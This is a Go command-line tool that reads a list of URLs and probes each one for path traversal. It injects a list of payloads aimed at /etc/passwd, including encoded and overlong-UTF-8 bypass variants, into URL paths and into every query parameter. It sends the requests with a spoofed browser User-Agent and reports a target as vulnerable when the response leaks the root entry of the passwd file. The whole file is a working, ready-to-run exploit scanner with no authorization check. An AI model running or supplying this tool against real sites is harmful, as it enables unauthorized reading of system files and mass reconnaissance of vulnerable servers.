package main

import (
	"bufio"
	"flag"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"path"
	"strings"
	"time"
)

var (
	payloads = []string{
		"../../../../etc/passwd",
		"....//....//....//....//etc/passwd",
		"/////////////////../../../../../../../../etc/passwd",
		"../../../../../../../../../../../../../../etc/passwd",
		"//..//..//..//..//..//..//..//..//..//..//../etc/passwd",
		"/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd",
		"../../../../../../../../../../etc/passwd",
		"%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
		"..%252f..%252f..%252f..%252fetc/passwd",
		"..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd",
		"..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
		"/etc/passwd",
		"////etc/passwd",
	}

	successIndicator = "root:x:0:0:"
	userAgent        = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
	timeout          = 10 * time.Second
)

func main() {
	// Parse command-line arguments
	urlFile := flag.String("l", "", "Path to the file containing URLs")
	verbose := flag.Bool("v", false, "Enable verbose output")
	outputFile := flag.String("o", "", "Path to the output file for results")
	flag.Parse()

	if *urlFile == "" {
		fmt.Println("Error: URL file is required. Use -l to specify the file.")
		flag.Usage()
		return
	}

	urls, err := readURLs(*urlFile)
	if err != nil {
		fmt.Printf("Error reading URLs: %v\n", err)
		return
	}

	client := &http.Client{
		Timeout: timeout,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	var results []string

	for _, rawURL := range urls {
		testURLs := generateTestURLs(rawURL)
		for _, testURL := range testURLs {
			vulnerable, err := checkVulnerability(client, testURL)
			if err != nil {
				if *verbose {
					fmt.Printf("Error checking %s: %v\n", testURL, err)
				}
				continue
			}
			if vulnerable {
				msg := fmt.Sprintf("[VULNERABLE] %s", testURL)
				results = append(results, msg)
				if *verbose {
					fmt.Println(msg)
				}
			} else if *verbose {
				fmt.Printf("[SAFE] %s\n", testURL)
			}
		}
	}

	// Save results to output file if specified
	if *outputFile != "" {
		err := saveResults(*outputFile, results)
		if err != nil {
			fmt.Printf("Error saving results to file: %v\n", err)
		} else if *verbose {
			fmt.Printf("Results saved to %s\n", *outputFile)
		}
	}
}

func readURLs(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var urls []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		urls = append(urls, scanner.Text())
	}
	return urls, scanner.Err()
}

func generateTestURLs(rawURL string) []string {
	u, err := url.Parse(rawURL)
	if err != nil {
		fmt.Printf("Error parsing URL %s: %v\n", rawURL, err)
		return nil
	}

	var testURLs []string

	// Generate path traversal URLs
	for _, payload := range payloads {
		// Path traversal in the URL path
		if pathTestURL := generatePathTestURL(u, payload); pathTestURL != "" {
			testURLs = append(testURLs, pathTestURL)
		}

		// Path traversal in query parameters
		testURLs = append(testURLs, generateQueryTestURLs(u, payload)...)
	}

	return testURLs
}

func generatePathTestURL(u *url.URL, payload string) string {
	originalPath := u.Path
	if originalPath == "" {
		originalPath = "/"
	}

	// Remove the last segment of the path
	dirPath := path.Dir(originalPath)
	if dirPath == "." {
		dirPath = ""
	}

	// Append the payload to the path
	newPath := dirPath + "/" + payload
	newURL := *u
	newURL.Path = newPath
	newURL.RawQuery = "" // Clear query parameters for path traversal
	return newURL.String()
}

func generateQueryTestURLs(u *url.URL, payload string) []string {
	query := u.Query()
	if len(query) == 0 {
		return nil
	}

	var testURLs []string

	// Iterate through all query parameters and inject the payload into each one
	for param := range query {
		newQuery := cloneQuery(query)
		newQuery.Set(param, payload) // Inject payload into the current parameter
		newURL := *u
		newURL.RawQuery = newQuery.Encode()
		testURLs = append(testURLs, newURL.String())
	}

	return testURLs
}

func cloneQuery(q url.Values) url.Values {
	newQ := make(url.Values)
	for k, v := range q {
		newQ[k] = append([]string{}, v...)
	}
	return newQ
}

func checkVulnerability(client *http.Client, testURL string) (bool, error) {
	req, err := http.NewRequest("GET", testURL, nil)
	if err != nil {
		return false, err
	}
	req.Header.Set("User-Agent", userAgent)

	resp, err := client.Do(req)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()

	buf := make([]byte, 1024)
	n, _ := resp.Body.Read(buf)
	content := string(buf[:n])

	return strings.Contains(content, successIndicator), nil
}

func saveResults(filename string, results []string) error {
	file, err := os.Create(filename)
	if err != nil {
		return err
	}
	defer file.Close()

	writer := bufio.NewWriter(file)
	for _, result := range results {
		_, err := writer.WriteString(result + "\n")
		if err != nil {
			return err
		}
	}
	return writer.Flush()
}
